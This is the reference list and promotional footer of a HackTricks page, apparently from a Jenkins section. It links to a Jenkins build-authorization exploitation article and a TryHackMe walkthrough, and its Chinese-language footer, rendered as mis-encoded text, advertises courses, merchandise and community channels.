* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricks**ä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
